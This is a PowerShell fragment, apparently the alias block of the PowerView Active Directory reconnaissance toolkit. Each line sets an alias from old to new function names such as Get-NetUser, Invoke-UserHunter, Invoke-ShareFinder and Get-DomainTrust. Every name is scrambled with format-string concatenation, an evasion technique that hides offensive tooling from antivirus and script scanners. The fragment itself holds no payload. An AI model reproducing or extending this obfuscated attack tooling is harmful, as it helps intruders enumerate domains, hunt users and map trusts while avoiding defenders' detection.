&("{1}{2}{3}{0}" -f's','S','et-','Alia') ("{2}{1}{0}" -f 'tForest','Ne','Get-') ("{3}{1}{0}{2}" -f'ore','F','st','Get-')
&("{2}{0}{1}"-f'-A','lias','Set') ("{1}{0}{4}{2}{3}" -f 'Fo','Get-Net','tD','omain','res') ("{3}{1}{4}{2}{0}" -f 'main','-F','stDo','Get','ore')
&("{0}{1}{2}" -f'Se','t-Alia','s') ("{5}{2}{3}{1}{0}{4}"-f 'Cata','tForest','et','-Ne','log','G') ("{2}{3}{7}{4}{5}{1}{0}{6}" -f'balCatal','stGlo','G','e','-F','ore','og','t')
&("{3}{2}{1}{0}" -f'ias','l','t-A','Se') ("{0}{1}{2}"-f'Get-','Ne','tUser') ("{0}{2}{3}{1}" -f 'Ge','nUser','t-Dom','ai')
&("{0}{1}"-f 'S','et-Alias') ("{2}{0}{3}{4}{1}"-f'et-U','Event','G','s','er') ("{2}{0}{1}{3}{4}" -f'-','Dom','Get','ainUserEven','t')
&("{0}{2}{1}"-f 'Set-','s','Alia') ("{0}{1}{3}{2}{4}" -f'Get-Ne','t','omput','C','er') ("{5}{4}{2}{0}{1}{3}" -f'omain','C','t-D','omputer','e','G')
&("{1}{0}{2}" -f 't-Al','Se','ias') ("{0}{2}{1}"-f'Get-A','bject','DO') ("{0}{4}{2}{1}{3}"-f'G','bj','nO','ect','et-Domai')
&("{2}{1}{0}" -f'ias','Al','Set-') ("{2}{0}{1}"-f'et-A','DObject','S') ("{2}{1}{0}{3}"-f'je','DomainOb','Set-','ct')
&("{1}{0}"-f't-Alias','Se') ("{4}{1}{2}{0}{3}"-f 'ect','et-O','bj','Acl','G') ("{3}{0}{2}{4}{1}" -f'et-','jectAcl','D','G','omainOb')
&("{0}{2}{1}{3}" -f'Se','-A','t','lias') ("{2}{0}{1}" -f'c','l','Add-ObjectA') ("{0}{1}{2}{3}"-f'Add-Do','mainObjec','tA','cl')
&("{0}{1}{2}" -f'Se','t-Ali','as') ("{4}{3}{2}{0}{1}" -f 'canne','r','e-ACLS','ok','Inv') ("{2}{4}{1}{6}{3}{0}{5}" -f 'm','Inte','Fin','o','d-','ainAcl','restingD')
&("{2}{1}{0}" -f 's','et-Alia','S') ("{1}{0}{2}"-f'-G','Get','UIDMap') ("{3}{4}{1}{5}{2}{0}" -f 'IDMap','D','inGU','Ge','t-','oma')
&("{1}{0}{2}" -f'-Alia','Set','s') ("{1}{2}{0}"-f'tOU','G','et-Ne') ("{0}{2}{1}{3}" -f 'Ge','Domain','t-','OU')
&("{0}{2}{1}{3}" -f'Se','Al','t-','ias') ("{2}{0}{1}"-f'it','e','Get-NetS') ("{3}{2}{0}{1}" -f'ain','Site','om','Get-D')
&("{1}{0}{2}"-f 'Ali','Set-','as') ("{0}{1}{2}" -f'Get-N','etS','ubnet') ("{1}{2}{0}{3}"-f 'u','Ge','t-DomainS','bnet')
&("{0}{1}"-f 'S','et-Alias') ("{1}{0}{2}{3}" -f 'Net','Get-','Gr','oup') ("{1}{0}{2}{3}"-f 't-D','Ge','omainG','roup')
&("{1}{0}"-f'Alias','Set-') ("{5}{2}{1}{3}{7}{4}{0}{6}" -f 'Grou','Manage','d-','dS','urity','Fin','ps','ec') ("{6}{0}{4}{5}{7}{1}{2}{3}"-f 'et-','ana','gedSecurityGrou','p','Dom','ain','G','M')
&("{0}{2}{1}" -f 'Se','ias','t-Al') ("{3}{0}{2}{1}" -f'G','upMember','ro','Get-Net') ("{0}{2}{3}{1}{4}" -f'Get-Dom','e','ainGrou','pM','mber')
&("{1}{0}{2}"-f 'et-Alia','S','s') ("{3}{1}{2}{0}{4}"-f 'File','Ne','t','Get-','Server') ("{0}{1}{2}{3}{4}" -f 'Get-D','oma','inFi','leSer','ver')
&("{2}{1}{0}" -f'lias','t-A','Se') ("{1}{2}{0}{3}"-f'FSsha','Get-','D','re') ("{2}{0}{4}{3}{1}" -f'mainD','hare','Get-Do','SS','F')
&("{2}{1}{0}" -f 'ias','Al','Set-') ("{1}{2}{0}" -f'PO','Get-Ne','tG') ("{0}{1}{2}{4}{3}" -f 'Ge','t','-','nGPO','Domai')
&("{0}{2}{1}" -f 'S','lias','et-A') ("{3}{0}{2}{1}" -f 'tG','roup','POG','Get-Ne') ("{1}{0}{4}{3}{2}" -f'-Doma','Get','lGroup','Loca','inGPO')
&("{2}{0}{1}" -f'et-A','lias','S') ("{0}{1}{3}{2}" -f'Find-GPOLo','c','tion','a') ("{2}{8}{5}{6}{3}{4}{7}{1}{0}" -f'ing','app','G','rLoc','alGr','ain','GPOUse','oupM','et-Dom')
&("{1}{2}{0}"-f'lias','Set-','A') ("{2}{1}{0}{4}{3}" -f't','nd-GPOCompu','Fi','n','erAdmi') ("{6}{3}{9}{2}{1}{0}{7}{8}{5}{10}{4}" -f'e','OComput','mainGP','-D','ng','upMa','Get','rLoc','alGro','o','ppi')
&("{0}{2}{1}"-f'Se','s','t-Alia') ("{3}{1}{2}{0}" -f'dOnLocal','t-Logg','e','Ge') ("{0}{3}{1}{2}" -f 'Ge','edO','n','t-RegLogg')
&("{1}{2}{0}"-f's','Se','t-Alia') ("{0}{3}{1}{5}{2}{4}" -f 'I','C','m','nvoke-','inAccess','heckLocalAd') ("{0}{1}{3}{4}{2}"-f'Te','st','s','-','AdminAcces')
&("{2}{3}{0}{1}"-f'Ali','as','S','et-') ("{1}{0}{2}" -f'Na','Get-Site','me') ("{2}{3}{6}{5}{0}{4}{1}"-f 'rSit','me','Ge','t-Ne','eNa','ompute','tC')
&("{1}{2}{0}"-f'lias','Se','t-A') ("{2}{0}{1}" -f 'rox','y','Get-P') ("{2}{3}{0}{1}" -f'g','Proxy','Get-WM','IRe')
&("{0}{2}{1}{3}"-f 'Se','Ali','t-','as') ("{3}{2}{0}{1}" -f 'edO','n','t-LastLogg','Ge') ("{5}{4}{0}{3}{1}{2}" -f'WMIRegLastL','gge','dOn','o','et-','G')
&("{3}{1}{2}{0}" -f's','Ali','a','Set-') ("{0}{3}{2}{4}{5}{1}"-f'Get-Cache','tion','DPCo','dR','nne','c') ("{8}{5}{7}{0}{1}{3}{2}{6}{4}" -f 'egCached','RD','o','PC','ection','t-WM','nn','IR','Ge')
&("{2}{1}{0}" -f'as','-Ali','Set') ("{0}{3}{6}{5}{1}{4}{2}"-f 'Get-Reg','oun','dDrive','ist','te','yM','r') ("{5}{2}{0}{3}{4}{1}" -f 't-WMIReg','ive','e','M','ountedDr','G')
&("{0}{2}{1}"-f'Set-Al','as','i') ("{2}{1}{0}{4}{3}"-f '-N','t','Ge','Process','et') ("{1}{2}{0}" -f 'rocess','Get','-WMIP')
&("{2}{1}{0}"-f 's','t-Alia','Se') ("{4}{2}{0}{3}{1}"-f'd','on','-Threa','edFuncti','Invoke') ne`w`-`ThrEAd`EDFuN`CTION
&("{2}{3}{1}{0}" -f 'lias','-A','Se','t') ("{4}{2}{3}{0}{1}"-f 'UserH','unter','e','-','Invok') ("{0}{4}{6}{1}{3}{2}{5}"-f 'Fin','UserLo','io','cat','d-','n','Domain')
&("{0}{1}" -f'S','et-Alias') ("{1}{6}{4}{0}{2}{3}{5}" -f 'P','Inv','ro','cessHunte','-','r','oke') ("{4}{0}{1}{3}{2}" -f 'd-D','o','Process','main','Fin')
&("{0}{2}{1}" -f 'Se','s','t-Alia') ("{0}{5}{3}{2}{1}{4}"-f'Invok','nt','tHu','n','er','e-Eve') ("{3}{4}{0}{1}{2}"-f 'inUse','rEv','ent','Fi','nd-Doma')
&("{2}{3}{0}{1}"-f 'i','as','Set','-Al') ("{1}{2}{0}{4}{3}"-f 'e-Sha','Inv','ok','nder','reFi') ("{2}{0}{3}{4}{1}" -f 'ind-Dom','re','F','ainSh','a')
&("{0}{1}"-f'Set-','Alias') ("{3}{2}{1}{0}" -f'Finder','e','voke-Fil','In') ("{4}{3}{0}{5}{2}{1}" -f 'Interes','le','ShareFi','d-','Fin','tingDomain')
&("{1}{0}{2}" -f'i','Set-Al','as') ("{2}{3}{4}{0}{1}"-f'LocalAdm','in','I','nvoke-Enu','merate') ("{6}{0}{4}{2}{5}{3}{1}" -f 'm','mber','inLoc','pMe','a','alGrou','Find-Do')
&("{1}{2}{0}"-f'ias','Se','t-Al') ("{0}{2}{3}{1}"-f'Get-N','t','etDomainTru','s') ("{1}{0}{2}{3}"-f'nT','Get-Domai','r','ust')
&("{2}{0}{1}" -f'et-A','lias','S') ("{1}{2}{5}{4}{3}{0}" -f't','Get-Ne','tFo','s','estTru','r') ("{1}{0}{2}" -f 'rest','Get-Fo','Trust')
&("{1}{2}{0}" -f'as','Se','t-Ali') ("{2}{1}{0}"-f 'eignUser','r','Find-Fo') ("{2}{4}{5}{1}{6}{3}{0}" -f 'ser','ore','Get-Domai','gnU','n','F','i')
&("{0}{1}{2}" -f'Se','t-Alia','s') ("{2}{3}{1}{0}" -f'up','nGro','Find-Fo','reig') ("{7}{4}{1}{5}{0}{2}{3}{8}{6}" -f'GroupM','reig','e','m','ainFo','n','er','Get-Dom','b')
&("{2}{0}{1}{3}" -f't-','A','Se','lias') ("{0}{3}{2}{4}{5}{1}"-f 'I','Trust','e-MapD','nvok','omai','n') ("{6}{3}{4}{5}{0}{1}{2}" -f 'p','p','ing','-','Domain','TrustMa','Get')
&("{0}{2}{1}" -f 'Se','as','t-Ali') ("{2}{3}{0}{1}{4}"-f 'inPo','l','Get','-Doma','icy') ("{0}{1}{4}{2}{3}"-f'Get','-','nPolicyDa','ta','Domai')

